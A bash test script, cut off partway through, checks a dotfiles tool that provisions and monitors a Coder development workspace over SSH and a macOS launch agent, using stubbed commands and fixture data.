#!/usr/bin/env bash
set -euo pipefail

topicDirectory="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
workspaceDomain="coder.dev.posthog.dev"
repoRoot="$(cd -- "$topicDirectory/.." && pwd)"
export DOTFILES_PLATFORM=linux
source "$repoRoot/test/harness.sh"

startStubbedSandbox devbox
printf 'work\n' > "$DOTFILES_MARKER_PATH"
linkCoreUtilities basename bash env cat sed awk grep head tail tr mkdir rm cp mv ln readlink realpath dirname chmod cmp diff hostname touch mktemp stat wc sleep ps nohup cut od date cksum paste
testNodePath="$(type -P node || true)"
if [[ -n "$testNodePath" ]]; then
  linkCoreUtilities node
fi

writeStub coder <<'STUB'
#!/usr/bin/env bash
printf 'coder %s\n' "$*" >> "$DOTFILES_TEST_LOG"
case "$1" in
  whoami)
    if [[ -f "$DOTFILES_TEST_STATE/logged-out" ]]; then printf 'keyring locked\n' >&2; exit 1; fi
    printf '[{"url":"https://coder.example","username":"fixture"}]\n'
    ;;
  list)
    if [[ -f "$DOTFILES_TEST_STATE/list-failed" ]]; then exit 1; fi
    if [[ -f "$DOTFILES_TEST_STATE/no-workspace" ]]; then printf '[]\n'; exit; fi
    printf '[{"name":"devbox-fixture","owner_name":"fixture","outdated":%s,"latest_build":{"status":"%s","transition":"%s","job":{"completed_at":"%s"}}}]\n' \
      "$([[ -f "$DOTFILES_TEST_STATE/workspace-outdated" ]] && printf true || printf false)" \
      "$(cat "$DOTFILES_TEST_STATE/workspace-status")" "$(cat "$DOTFILES_TEST_STATE/workspace-transition" 2>/dev/null || printf stop)" \
      "$(cat "$DOTFILES_TEST_STATE/workspace-completed-at" 2>/dev/null || true)"
    ;;
  start) printf 'running\n' > "$DOTFILES_TEST_STATE/workspace-status" ;;
  ssh)
    printf '%s %s\n' "${CODER_SSH_DISABLE_AUTOSTART:-}" "${CODER_SSH_USAGE_APP:-}" >> "$DOTFILES_TEST_STATE/ssh-safety"
    [[ ! -f "$DOTFILES_TEST_STATE/ssh-failed" ]] || exit 1
    [[ ! -f "$DOTFILES_TEST_STATE/ssh-hangs" ]] || exec sleep 30
    if [[ -f "$DOTFILES_TEST_STATE/execute-dotfiles" && "${7:-}" == sync-repos ]]; then
      cat > /dev/null
      DOTFILES_TEST_REMOTE=1 XDG_STATE_HOME="$DOTFILES_TEST_STATE/remote-home/.local/state" \
        WIZARD_WORKBENCH_POSTHOG_API_KEY=phx_fixture WIZARD_WORKBENCH_GATEWAY_TOKEN=phs_fixture \
        HOME="$DOTFILES_TEST_STATE/remote-home" bash "$DOTFILES_TEST_STATE/remote-provision.sh" sync-repos coder.dev.posthog.dev
      exit
    fi
    if [[ -f "$DOTFILES_TEST_STATE/execute-config" && "${7:-}" == provision ]]; then
      XDG_STATE_HOME="$DOTFILES_TEST_STATE/remote-home/.local/state" HOME="$DOTFILES_TEST_STATE/remote-home" \
        CODER_WORKSPACE_AGENT_NAME=dev CODER_WORKSPACE_NAME=devbox-fixture CODER_WORKSPACE_OWNER_NAME=fixture \
        bash "$DOTFILES_TEST_STATE/provision-with-test-listeners.sh" provision coder.dev.posthog.dev
      exit
    fi
    if [[ "${7:-}" == collect-settings ]]; then
      cat > "$DOTFILES_TEST_STATE/collect-script"
      if [[ -f "$DOTFILES_TEST_STATE/execute-collect" ]]; then
        HOME="$DOTFILES_TEST_STATE/remote-home" bash "$DOTFILES_TEST_STATE/collect-script"
        exit
      fi
      if [[ -f "$DOTFILES_TEST_STATE/collect-packet" ]]; then
        cat "$DOTFILES_TEST_STATE/collect-packet"
        exit
      fi
      printf '{"home":"/home/coder","live":{},"base":{},"projectPaths":[]}\n'
      exit
    fi
    if [[ "${7:-}" == dotfiles ]]; then
      cat > /dev/null
      if [[ -f "$DOTFILES_TEST_STATE/execute-dotfiles" ]]; then
        DOTFILES_TEST_REMOTE=1 XDG_STATE_HOME="$DOTFILES_TEST_STATE/remote-home/.local/state" \
          HOME="$DOTFILES_TEST_STATE/remote-home" bash "$DOTFILES_TEST_STATE/remote-provision.sh" dotfiles coder.dev.posthog.dev
        exit
      fi
      printf '[present] dotfiles: fixture\n'
      exit
    fi
    cat > "$DOTFILES_TEST_STATE/pushed-script"
    printf '%s\n' "${CODER_SSH_DISABLE_AUTOSTART:-}" > "$DOTFILES_TEST_STATE/ssh-autostart-disabled"
    printf '%s\n' "${CODER_SSH_USAGE_APP:-}" > "$DOTFILES_TEST_STATE/ssh-usage-app"
    bash -c "set -- ${*:4}; printf '%s\\n' \"\$@\"" > "$DOTFILES_TEST_STATE/remote-arguments"
    [[ ! -f "$DOTFILES_TEST_STATE/ssh-failed" ]] || exit 1
    if [[ -f "$DOTFILES_TEST_STATE/execute-provision" ]]; then
      XDG_STATE_HOME="$DOTFILES_TEST_STATE/remote-home/.local/state" HOME="$DOTFILES_TEST_STATE/remote-home" CODER_WORKSPACE_AGENT_NAME=dev CODER_WORKSPACE_NAME=devbox-fixture \
        CODER_WORKSPACE_OWNER_NAME=fixture bash "$DOTFILES_TEST_STATE/provision-with-test-listeners.sh" "${@:7}"
      exit
    fi
    if [[ -f "$DOTFILES_TEST_STATE/provision-output" ]]; then
      cat "$DOTFILES_TEST_STATE/provision-output"
      exit 0
    fi
    printf '[present] fixture: provisioned\nhttps://fixture.invalid/\n'
    ;;
  *) exit 1 ;;
esac
STUB
for workbenchToolName in pnpm phrocs; do
  writeStub "$workbenchToolName" <<'STUB'
#!/usr/bin/env bash
printf '%s %s\n' "${0##*/}" "$*" >> "$DOTFILES_TEST_LOG"
STUB
  provideCommand "$workbenchToolName"
done

testGitPath="$(type -P git)"
export DOTFILES_TEST_GIT_PATH="$testGitPath"
dotfilesOriginRepo="$stubState/dotfiles-origin"
commitDotfilesOrigin() {
  "$testGitPath" -C "$dotfilesOriginRepo" add -A
  "$testGitPath" -C "$dotfilesOriginRepo" -c user.name=fixture -c user.email=fixture@example.invalid \
    -c commit.gpgsign=false commit -qm "$1"
}
mkdir -p "$dotfilesOriginRepo/profiles/work-server" "$dotfilesOriginRepo/converge-probe"
cp -R "$repoRoot/script" "$repoRoot/bin" "$dotfilesOriginRepo/"
printf '{"platform":"linux","topics":["converge-probe"]}\n' > "$dotfilesOriginRepo/profiles/work-server/profile.json"
cat > "$dotfilesOriginRepo/converge-probe/install.sh" <<'TOPIC'
#!/usr/bin/env bash
printf 'bootstrap %s\n' "$DOTFILES_PROFILE" >> "$DOTFILES_TEST_LOG"
printf '%s\n' "$PATH" > "$DOTFILES_TEST_STATE/bootstrap-path"
[[ ! -f "$DOTFILES_TEST_STATE/bootstrap-failed" ]] || exit 1
mkdir -p "$HOME/.claude/hooks"
ln -sf "$HOME/.dotfiles/converge-probe/hook.mjs" "$HOME/.claude/hooks/converge-probe.mjs"
TOPIC
printf 'committed hook\n' > "$dotfilesOriginRepo/converge-probe/hook.mjs"
"$testGitPath" -C "$dotfilesOriginRepo" init -q -b main
commitDotfilesOrigin fixture
writeStub git <<'STUB'
#!/usr/bin/env bash
printf 'git %s\n' "$*" >> "$DOTFILES_TEST_LOG"
if [[ "${1:-}" == --version ]]; then
  printf 'git version %s\n' "$(cat "$DOTFILES_TEST_STATE/git-version" 2>/dev/null || printf '2.55.0')"
  exit
fi
if [[ "${1:-}" == config ]]; then
  exec "$DOTFILES_TEST_GIT_PATH" "$@"
fi
if [[ "${DOTFILES_TEST_REMOTE:-}" == 1 ]]; then
  if [[ "${1:-}" == clone && "${@: -2:1}" == https://github.com/johncwaters/dotfiles.git ]]; then
    [[ ! -f "$DOTFILES_TEST_STATE/dotfiles-clone-failed" ]] || exit 128
    exec "$DOTFILES_TEST_GIT_PATH" clone --quiet -- "$DOTFILES_TEST_STATE/dotfiles-origin" "${@: -1}"
  fi
  if [[ "${1:-}" == clone ]]; then
    cloneUrl="${@: -2:1}"
    cloneDestination="${@: -1}"
    [[ ! -f "$DOTFILES_TEST_STATE/clone-failed" ]] || exit 128
    "$DOTFILES_TEST_GIT_PATH" init -q -b main "$cloneDestination" || exit
    "$DOTFILES_TEST_GIT_PATH" -C "$cloneDestination" remote add origin "$cloneUrl" || exit
    printf '{"name":"fixture"}\n' > "$cloneDestination/package.json"
    "$DOTFILES_TEST_GIT_PATH" -C "$cloneDestination" add package.json || exit
    "$DOTFILES_TEST_GIT_PATH" -C "$cloneDestination" -c user.name=fixture -c user.email=fixture@example.invalid \
      -c commit.gpgsign=false commit -qm clone || exit
    "$DOTFILES_TEST_GIT_PATH" -C "$cloneDestination" config branch.main.remote origin || exit
    "$DOTFILES_TEST_GIT_PATH" -C "$cloneDestination" config branch.main.merge refs/heads/main
    exit
  fi
  if [[ "${3:-}" == pull ]]; then
    pulledBranch="$("$DOTFILES_TEST_GIT_PATH" -C "$2" symbolic-ref -q --short HEAD)" || exit 1
    "$DOTFILES_TEST_GIT_PATH" -C "$2" config "branch.$pulledBranch.merge" > /dev/null
    exit
  fi
  exec "$DOTFILES_TEST_GIT_PATH" "$@"
fi
exec "$DOTFILES_TEST_GIT_PATH" "$@"
STUB
provideCommand git

runInstall() {
  runInStubbedSandbox "$sandbox" DOTFILES_PROFILE=work NO_COLOR=1 bash "$topicDirectory/install.sh"
}

runDevbox() {
  runInStubbedSandbox "$sandbox" DOTFILES_PROFILE=work DEVBOX_FORWARD_ANY_HOUR=1 bash -c 'source "$1/commands.bash"; shift; devbox "$@"' _ "$topicDirectory" "$@"
}

dotfilesConvergeSitsBetweenPrepareAndProvision() {
  [[ "$(sed -nE 's/^coder ssh .* (prepare|dotfiles|sync-repos|provision) [^ ]+$/\1/p' "$commandLog" | tr '\n' ' ')" == 'prepare dotfiles sync-repos provision ' ]]
}

printf '\ndevbox topic\n'
printf 'running\n' > "$stubState/workspace-status"
missingCoderOutput="$(runInstall)"
check "absent Coder skips cleanly without a warning" outputLacks "$missingCoderOutput" '[warn]'
check "absent Coder explains the skip" outputHas "$missingCoderOutput" 'Coder CLI absent'
check "absent Coder never connects" logLacks 'coder ssh'
missingCoderEnsureStatus=0
missingCoderEnsureOutput="$(runDevbox ensure 2>&1)" || missingCoderEnsureStatus=$?
check "ensure without Coder exits cleanly" test "$missingCoderEnsureStatus" -eq 0
check "ensure without Coder prints one informational line" \
  test "$(wc -l <<< "$missingCoderEnsureOutput" | tr -d ' ')" -eq 1
check "ensure without Coder names the skip" outputHas "$missingCoderEnsureOutput" 'devbox ensure: skipped; Coder CLI absent'
check "ensure without Coder never connects or starts" logLacks 'coder '

mkdir -p "$sandbox/.local/bin"
cp "$stubState/available/coder" "$sandbox/.local/bin/coder"
touch "$stubState/logged-out"
loggedOutStatus=0
loggedOutOutput="$(runInstall)" || loggedOutStatus=$?
check "a failing coder whoami warns in converge" outputHas "$loggedOutOutput" '[warn] devbox'
check "a failing coder whoami names the login fix in converge" \
  outputHas "$loggedOutOutput" 'coder whoami failed; run coder login https://coder.dev.posthog.dev'
check "a failing coder whoami yields a nonzero converge status" test "$loggedOutStatus" -eq 1
check "logged-out converge never connects" logLacks 'coder ssh'
check "logged-out converge never starts a box" logLacks 'coder start'
loggedOutEnsureStatus=0
loggedOutEnsureError="$(runDevbox ensure 2>&1 >/dev/null)" || loggedOutEnsureStatus=$?
check "a failing coder whoami fails ensure" test "$loggedOutEnsureStatus" -ne 0
check "a failing coder whoami tells the ensure log how to log in" \
  outputHas "$loggedOutEnsureError" 'devbox ensure: coder whoami failed; run coder login https://coder.dev.posthog.dev'
check "a failing coder whoami keeps coder's own error in the ensure log" \
  outputHas "$loggedOutEnsureError" 'coder said: keyring locked'
check "logged-out ensure never connects" logLacks 'coder ssh'
check "logged-out ensure never starts a box" logLacks 'coder start'
rm -f "$stubState/logged-out"

if [[ -z "$testNodePath" ]]; then
  printf '  skip workspace and config checks: node is unavailable on the test machine\n'
  reportTopicResults devbox
fi

touch "$stubState/no-workspace"
: > "$commandLog"
missingWorkspaceOutput="$(runInstall)"
check "missing workspace skips cleanly" outputLacks "$missingWorkspaceOutput" '[warn]'
check "missing workspace names the expected workspace" outputHas "$missingWorkspaceOutput" 'no workspace named devbox-fixture'
check "missing workspace never connects" logLacks 'coder ssh'
check "missing workspace never starts a box" logLacks 'coder start'
missingWorkspaceEnsureStatus=0
missingWorkspaceEnsureOutput="$(runDevbox ensure 2>&1)" || missingWorkspaceEnsureStatus=$?
check "ensure without a workspace exits cleanly" test "$missingWorkspaceEnsureStatus" -eq 0
check "ensure without a workspace prints one informational line" \
  test "$(wc -l <<< "$missingWorkspaceEnsureOutput" | tr -d ' ')" -eq 1
check "ensure without a workspace names the skip" \
  outputHas "$missingWorkspaceEnsureOutput" 'devbox ensure: skipped; no workspace named devbox-fixture'
check "ensure without a workspace never connects" logLacks 'coder ssh'
check "ensure without a workspace never starts a box" logLacks 'coder start'
rm -f "$stubState/no-workspace"

for workspaceStatus in stopped starting failed; do
  printf '%s\n' "$workspaceStatus" > "$stubState/workspace-status"
  : > "$commandLog"
  skippedOutput="$(runInstall)"
  check "$workspaceStatus workspace skips without warning" outputLacks "$skippedOutput" '[warn]'
  check "$workspaceStatus workspace names its status" outputHas "$skippedOutput" "is $workspaceStatus"
  check "$workspaceStatus workspace never connects" logLacks 'coder ssh'
  check "$workspaceStatus workspace never starts from converge" logLacks 'coder start'
  skippedEnsureOutput="$(runDevbox ensure)"
  check "ensure names the $workspaceStatus skip" outputHas "$skippedEnsureOutput" "devbox ensure: skipped; workspace is $workspaceStatus"
  check "ensure skips $workspaceStatus without connecting" logLacks 'coder ssh'
  check "ensure never starts a $workspaceStatus workspace" logLacks 'coder start'
done

runEnsureOutsideWorkingHours() {
  writeStub date <<'STUB'
#!/usr/bin/env bash
printf '6 03\n'
STUB
  provideCommand date
  runInStubbedSandbox "$sandbox" DOTFILES_PROFILE=work bash -c 'source "$1/commands.bash"; devbox ensure' _ "$topicDirectory"
  withdrawCommand date
}

node -e 'console.log(new Date().toISOString())' > "$stubState/workspace-completed-at"
printf 'failed\n' > "$stubState/workspace-status"
: > "$commandLog"
runDevbox ensure >/dev/null
check "ensure waits out a fresh failed build" logLacks 'coder start'

node -e 'console.log(new Date(Date.now() - 2 * 3600 * 1000).toISOString())' > "$stubState/workspace-completed-at"
for workspaceStatus in failed running; do
  printf '%s\n' "$workspaceStatus" > "$stubState/workspace-status"
  : > "$commandLog"
  outsideHoursOutput="$(runEnsureOutsideWorkingHours)"
  check "ensure outside working hours never contacts a $workspaceStatus workspace" logLacks 'coder '
  check "ensure outside working hours names the skip" outputHas "$outsideHoursOutput" 'devbox ensure: skipped; outside working hours'
done
printf 'failed\n' > "$stubState/workspace-status"

printf 'delete\n' > "$stubState/workspace-transition"
: > "$commandLog"
runDevbox ensure >/dev/null
check "ensure never starts a workspace whose delete failed" logLacks 'coder start'
rm -f "$stubState/workspace-transition"

: > "$commandLog"
runDevbox ensure >/dev/null
check "ensure starts a failed workspace in working hours" logHas 'coder start devbox-fixture --yes'
check "ensure provisions a recovered workspace in the same run" logHas "coder ssh devbox-fixture -- bash -s -- provision $workspaceDomain"
rm -f "$stubState/workspace-completed-at"

printf 'running\n' > "$stubState/workspace-status"
: > "$commandLog"
rm -f "$stubState/ssh-usage-app"
runningOutput="$(runInstall)"
check "running converge pushes with the profile workspace domain" logHas "coder ssh devbox-fixture -- bash -s -- provision $workspaceDomain"
check "running converge pipes the exact standalone script" cmp -s "$repoRoot/profiles/work/devbox/provision.sh" "$stubState/pushed-script"
check "SSH cannot auto-start a box after a status race" grep -qx true "$stubState/ssh-autostart-disabled"
check "converge SSH skips the CLI usage report" grep -qx disable "$stubState/ssh-usage-app"
check "converge runs the box dotfiles converge and repo sync after prepare and before provision" dotfilesConvergeSitsBetweenPrepareAndProvision
check "running converge does not start a workspace" logLacks 'coder start'
check "an unchanged provision reports no laptop changes" reportsNoChanges "$runningOutput"
check "an unchanged provision reports the devbox as present" outputMatches "$runningOutput" '\[ -- \] devbox +devbox-fixture provisioned'
check "a box on the current template gets no outdated-template line" outputLacks "$runningOutput" 'outdated Coder template'
: > "$stubState/workspace-outdated"
outdatedOutput="$(runInstall)"
rm -f "$stubState/workspace-outdated"
check "a box on an outdated template gets exactly one line naming coder update" \
  test "$(grep -c 'devbox-fixture runs an outdated Coder template; coder update devbox-fixture rebuilds it' <<< "$outdatedOutput")" -eq 1
check "an outdated template still reports no laptop changes" reportsNoChanges "$outdatedOutput"

printf '[installed] config: merged; runtime records preserved\nhttps://fixture.invalid/\n' > "$stubState/provision-output"
installedOutput="$(runInstall)"
check "a provision that changed the box reports an install" outputHas "$installedOutput" '[ ++ ] devbox'
check "a provision that changed the box does not warn" outputLacks "$installedOutput" '[warn]'

printf '[installed] glimmervoid: 0.29.1\n[warned] config: changes pending; run devbox restart-glimmervoid\nhttps://fixture.invalid/\n' > "$stubState/provision-output"
warnedStatus=0
warnedOutput="$(runInstall)" || warnedStatus=$?
check "a remote warning yields a nonzero converge status" test "$warnedStatus" -eq 1
check "a remote warning is counted as a laptop warning" outputHas "$warnedOutput" '[warn] devbox'
check "a remote warning outranks a remote install" outputLacks "$warnedOutput" '[ ++ ] devbox'
rm -f "$stubState/provision-output"

: > "$commandLog"
rm -f "$stubState/ssh-usage-app"
runDevbox ensure >/dev/null
check "ensure provisions a running workspace with the profile workspace domain" \
  logHas "coder ssh devbox-fixture -- bash -s -- provision $workspaceDomain"
check "ensure pushes the exact standalone script" cmp -s "$repoRoot/profiles/work/devbox/provision.sh" "$stubState/pushed-script"
check "ensure disables SSH autostart after a status race" grep -qx true "$stubState/ssh-autostart-disabled"
check "ensure SSH skips the CLI usage report" grep -qx disable "$stubState/ssh-usage-app"
check "ensure runs the box dotfiles converge and repo sync after prepare and before provision" dotfilesConvergeSitsBetweenPrepareAndProvision
check "ensure never starts a running workspace" logLacks 'coder start'

for failureMarker in list-failed ssh-failed; do
  touch "$stubState/$failureMarker"
  ensureFailureStatus=0
  runDevbox ensure >/dev/null 2>&1 || ensureFailureStatus=$?
  check "ensure propagates $failureMarker" test "$ensureFailureStatus" -ne 0
  rm -f "$stubState/$failureMarker"
done

touch "$stubState/ssh-hangs"
hungEnsureStatus=0
hungEnsureError="$(runInStubbedSandbox "$sandbox" DOTFILES_PROFILE=work DEVBOX_FORWARD_ANY_HOUR=1 DEVBOX_SSH_DEADLINE_SECONDS=1 \
  bash -c 'source "$1/commands.bash"; devbox ensure' _ "$topicDirectory" 2>&1 >/dev/null)" || hungEnsureStatus=$?
rm -f "$stubState/ssh-hangs"
check "a hung coder ssh fails ensure" test "$hungEnsureStatus" -ne 0
check "a hung coder ssh is killed at its deadline" outputHas "$hungEnsureError" 'coder ssh ran past 1 seconds; killed'

ensureUsageStatus=0
runDevbox ensure extra >/dev/null 2>&1 || ensureUsageStatus=$?
check "ensure rejects extra arguments" test "$ensureUsageStatus" -ne 0

writeStub id <<'STUB'
#!/usr/bin/env bash
if [[ "${1:-}" == -u ]]; then printf '501\n'; fi
STUB
writeStub launchctl <<'STUB'
#!/usr/bin/env bash
printf 'launchctl %s\n' "$*" >> "$DOTFILES_TEST_LOG"
loadedMarker="$DOTFILES_TEST_STATE/devbox-agent-loaded"
case "${1:-}" in
  print) [[ -f "$loadedMarker" ]] ;;
  bootout) rm -f "$loadedMarker" ;;
  bootstrap)
    [[ ! -f "$DOTFILES_TEST_STATE/launch-bootstrap-fails" ]] || exit 1
    touch "$loadedMarker"
    ;;
  *) exit 1 ;;
esac
STUB
provideCommand id
provideCommand launchctl
writeDarwinDirectoryServiceStub "$stubBin"

darwinHomebrewPrefix="$sandbox/homebrew"
launchAgentPath="$sandbox/Library/LaunchAgents/dev.dotfiles.devbox.ensure.plist"
launchAgentPending="$sandbox/.local/state/dotfiles/launchd-dev.dotfiles.devbox.ensure-pending"
runDarwinInstall() {
  runInStubbedSandbox "$sandbox" DOTFILES_PLATFORM=darwin \
    DOTFILES_TEST_HOMEBREW_PREFIX="$darwinHomebrewPrefix" \
    DOTFILES_PROFILE=work NO_COLOR=1 bash "$topicDirectory/install.sh"
}

: > "$commandLog"
runInstall >/dev/null
check "linux never renders the devbox launch agent" test ! -e "$launchAgentPath"
check "linux never calls launchctl" logLacks 'launchctl '

touch "$stubState/logged-out"
: > "$commandLog"
loggedOutDarwinStatus=0
loggedOutDarwinOutput="$(runDarwinInstall)" || loggedOutDarwinStatus=$?
check "darwin installs the poller while logged out" test -f "$launchAgentPath"
check "a logged-out darwin install warns only about the login" \
  test "$(grep -c '\[warn\]' <<< "$loggedOutDarwinOutput")" -eq 1
check "a logged-out darwin install exits with its login warning" test "$loggedOutDarwinStatus" -eq 1
check "darwin invokes Homebrew bash" grep -qF "<string>$darwinHomebrewPrefix/bin/bash</string>" "$launchAgentPath"
check "darwin invokes devbox through the dotfiles alias" \
  grep -qF "<string>$sandbox/.dotfiles/devbox/commands.bash</string>" "$launchAgentPath"
check "darwin logs stdout under converge state" \
  grep -qF "$sandbox/.local/state/dotfiles/devbox-ensure.stdout.log" "$launchAgentPath"
check "darwin logs stderr under converge state" \
  grep -qF "$sandbox/.local/state/dotfiles/devbox-ensure.stderr.log" "$launchAgentPath"
check "darwin supplies a PATH with Homebrew and Coder" \
  grep -qF "$darwinHomebrewPrefix/bin:$darwinHomebrewPrefix/sbin:$sandbox/.npm-global/bin:$sandbox/.local/bin:/usr/local/bin:/usr/bin:/bin" "$launchAgentPath"
check "darwin protects the rendered plist" test "$(fileModeOf "$launchAgentPath")" = 600
check "darwin probes the poller" logHas 'launchctl print gui/501/dev.dotfiles.devbox.ensure'
check "darwin bootstraps the poller" logHas "launchctl bootstrap gui/501 $launchAgentPath"
check "installing a logged-out poller never connects" logLacks 'coder ssh'

: > "$commandLog"
secondDarwinStatus=0
secondDarwinOutput="$(runDarwinInstall)" || secondDarwinStatus=$?
check "unchanged darwin install reports no changes" reportsNoChanges "$secondDarwinOutput"
check "unchanged logged-out darwin install exits with its login warning" test "$secondDarwinStatus" -eq 1
check "unchanged darwin install probes the poller" logHas 'launchctl print gui/501/dev.dotfiles.devbox.ensure'
check "unchanged darwin install never boots out" logLacks 'launchctl bootout'
check "unchanged darwin install never bootstraps" logLacks 'launchctl bootstrap'
rm -f "$stubState/logged-out"

launchAgentArguments=()
while IFS= read -r launchAgentArgument; do
  launchAgentArguments+=("$launchAgentArgument")
done < <(sed -n '/<key>ProgramArguments<\/key>/,/<\/array>/p' "$launchAgentPath" \
  | sed -n 's|^ *<string>\(.*\)</string>$|\1|p')
launchAgentArguments[0]="$(type -P bash)"
: > "$commandLog"
runInStubbedSandbox "$sandbox" "${launchAgentArguments[@]}" >/dev/null
check "rendered program arguments provision through ensure" \
  logHas "coder ssh devbox-fixture -- bash -s -- provision $workspaceDomain"
check "rendered launchd ensure converges the box dotfiles" logHas "dotfiles $workspaceDomain"
check "rendered program arguments never start a workspace" logLacks 'coder start'

printf 'hand edit\n' >> "$launchAgentPath"
: > "$commandLog"
runDarwinInstall >/dev/null
check "changed darwin install boots out the old poller" logHas "launchctl bootout gui/501 $launchAgentPath"
check "changed darwin install loads the refreshed poller" logHas "launchctl bootstrap gui/501 $launchAgentPath"
check "changed darwin install preserves hand edits" test -f "$launchAgentPath.pre-dotfiles.bak"

rm -f "$stubState/devbox-agent-loaded"
touch "$stubState/launch-bootstrap-fails"
: > "$commandLog"
failedAgentStatus=0
failedAgentOutput="$(runDarwinInstall)" || failedAgentStatus=$?
check "failed poller load fails install" test "$failedAgentStatus" -ne 0
check "failed poller load remains owed" test -f "$launchAgentPending"
check "failed poller load still provisions the box" \
  logHas "coder ssh devbox-fixture -- bash -s -- provision $workspaceDomain"
check "failed poller load is reported as a launch agent warning" outputHas "$failedAgentOutput" '[warn] devbox launch agent'
check "darwin provisions the box before it loads the poller" \
  outputMatches "$(grep -E 'coder ssh|launchctl bootstrap' "$commandLog" | head -1)" '^coder ssh'
rm -f "$stubState/launch-bootstrap-fails"
runDarwinInstall >/dev/null
check "a later install clears the owed poller load" test ! -e "$launchAgentPending"

printf 'hand edit\n' >> "$launchAgentPath"
: > "$commandLog"
reloadOwedStatus=0
reloadOwedOutput="$(DOTFILES_CONVERGE_AGENT=1 runDarwinInstall)" || reloadOwedStatus=$?
check "an owed reload under the converge agent fails install" test "$reloadOwedStatus" -ne 0
check "an owed reload under the converge agent is reported" outputHas "$reloadOwedOutput" 'reload owed'
check "an owed reload under the converge agent still provisions the box" \
  logHas "coder ssh devbox-fixture -- bash -s -- provision $workspaceDomain"
check "an owed reload under the converge agent never boots out its poller" logLacks 'launchctl bootout'
runDarwinInstall >/dev/null
check "a later install pays the owed reload" test ! -e "$launchAgentPending"

for failureMarker in list-failed ssh-failed; do
  touch "$stubState/$failureMarker"
  failedStatus=0
  failedOutput="$(runInstall 2>&1)" || failedStatus=$?
  check "$failureMarker yields a nonzero converge status" test "$failedStatus" -eq 1
  check "$failureMarker reports a warning" outputHas "$failedOutput" '[warn]'
  rm -f "$stubState/$failureMarker"
done

printf 'stopped\n' > "$stubState/workspace-status"
: > "$commandLog"
upOutput="$(runDevbox up)"
check "up starts a stopped workspace" logHas 'coder start devbox-fixture --yes'
check "up waits through the default Coder ssh behavior" logHas "coder ssh devbox-fixture -- bash -s -- provision $workspaceDomain"
check "up pushes the exact standalone script" cmp -s "$repoRoot/profiles/work/devbox/provision.sh" "$stubState/pushed-script"
check "up prints the dashboard URL" outputHas "$upOutput" 'https://fixture.invalid/'
check "up runs the box dotfiles converge and repo sync after prepare and before provision" dotfilesConvergeSitsBetweenPrepareAndProvision
check "up starts before it connects" outputMatches "$(grep -E 'coder start|coder ssh' "$commandLog" | head -1)" '^coder start'
: > "$commandLog"
runDevbox up >/dev/null
check "up does not start a running workspace" logLacks 'coder start'
printf 'failed\n' > "$stubState/workspace-status"
: > "$commandLog"
runDevbox up >/dev/null
check "up starts a failed workspace" logHas 'coder start devbox-fixture --yes'

: > "$commandLog"
restartStatus=0
restartOutput="$(runDevbox restart-glimmervoid < /dev/null 2>&1)" || restartStatus=$?
check "restart refuses EOF without confirmation" test "$restartStatus" -ne 0
check "restart cancellation makes no connection" logLacks 'coder ssh'
check "restart cancellation names the consequence in its prompt" outputHas "$restartOutput" 'end all agent sessions'
restartStatus=0
printf 'n\n' | runDevbox restart-glimmervoid >/dev/null 2>&1 || restartStatus=$?
check "restart refuses a negative confirmation" test "$restartStatus" -ne 0
check "negative confirmation makes no connection" logLacks 'coder ssh'
printf 'y\n' | runDevbox restart-glimmervoid >/dev/null 2>&1
check "affirmative confirmation requests the shared restart" logHas "restart $workspaceDomain"
: > "$commandLog"
runDevbox restart-glimmervoid --yes >/dev/null
check "explicit yes requests the shared restart" logHas "restart $workspaceDomain"

: > "$commandLog"
runDevbox pair "laptop's label; literal" >/dev/null
check "pair preserves a quoted label through the remote shell" \
  test "$(tail -1 "$stubState/remote-arguments")" = "laptop's label; literal"
check "pair sends exactly one label argument" test "$(wc -l < "$stubState/remote-arguments" | tr -d ' ')" -eq 6
runDevbox pair >/dev/null
check "pair defaults to the laptop hostname" test "$(tail -1 "$stubState/remote-arguments")" = "$(hostname)"
: > "$commandLog"
rm -f "$stubState/ssh-usage-app"
statusOutput="$(runDevbox status)"
check "status reports the workspace" outputHas "$statusOutput" 'workspace devbox-fixture: running'
check "status SSH skips the CLI usage report" grep -qx disable "$stubState/ssh-usage-app"
check "status uses the shared remote status action" logHas "status $workspaceDomain"
check "status never starts a workspace" logLacks 'coder start'
writeStub ssh <<'STUB'
#!/usr/bin/env bash
printf '%s\n' "$$" > "$DOTFILES_TEST_STATE/forward-ssh-pid"
trap '' TERM
exec sleep 30
STUB
provideCommand ssh
writeStub date <<'STUB'
#!/usr/bin/env bash
printf '6 03\n'
STUB
provideCommand date
rm -f "$stubState/forward-ssh-pid"
forwardStatus=0
runInStubbedSandbox "$sandbox" DOTFILES_PROFILE=work SSH_AUTH_SOCK="$stubState/agent.sock" \
  bash -c 'source "$1/commands.bash"; devbox forward-agent' _ "$topicDirectory" 2>/dev/null || forwardStatus=$?
check "agent forward outside weekday hours exits cleanly" test "$forwardStatus" -eq 0
check "agent forward outside weekday hours never connects" test ! -e "$stubState/forward-ssh-pid"
forwardStatus=0
runInStubbedSandbox "$sandbox" DOTFILES_PROFILE=work SSH_AUTH_SOCK="$stubState/agent.sock" \
  DEVBOX_FORWARD_HEARTBEAT_DEADLINE_SECONDS=1 DEVBOX_FORWARD_ANY_HOUR=1 \
  bash -c 'source "$1/commands.bash"; devbox forward-agent' _ "$topicDirectory" 2>/dev/null || forwardStatus=$?
check "a silent agent forward ends so launchd reconnects" test "$forwardStatus" -ne 0
check "a silent agent forward that ignores SIGTERM is killed" \
  bash -c '! kill -0 "$(cat "$1")" 2>/dev/null' _ "$stubState/forward-ssh-pid"
withdrawCommand ssh
withdrawCommand date
printf 'stopped\n' > "$stubState/workspace-status"
: > "$commandLog"
stoppedStatusOutput="$(runDevbox status)"
check "stopped status does not connect" logLacks 'coder ssh'
check "stopped status prints the owner forwarding URL" outputHas "$stoppedStatusOutput" 'https://3457--dev--devbox-fixture--fixture.coder.dev.posthog.dev/'

writeStub flock <<'STUB'
#!/usr/bin/env bash
printf 'flock %s\n' "$*" >> "$DOTFILES_TEST_LOG"
[[ ! -f "$DOTFILES_TEST_STATE/provision-lock-held" ]]
STUB
provideCommand flock

export DOTFILES_TEST_NODE_PATH="$testNodePath"
writeStub node <<'STUB'
#!/usr/bin/env bash
case "${2:-}" in
  *snapshot.serverBuild*) printf '0.28.0\n'; exit ;;
esac
exec "$DOTFILES_TEST_NODE_PATH" "$@"
STUB
glimmervoidScriptPath="$sandbox/.local/lib/node_modules/glimmervoid/dist/cli.js"
mkdir -p "${glimmervoidScriptPath%/*}"
cat > "$glimmervoidScriptPath" <<'JS'
#!/usr/bin/env node
const fs = require("node:fs");
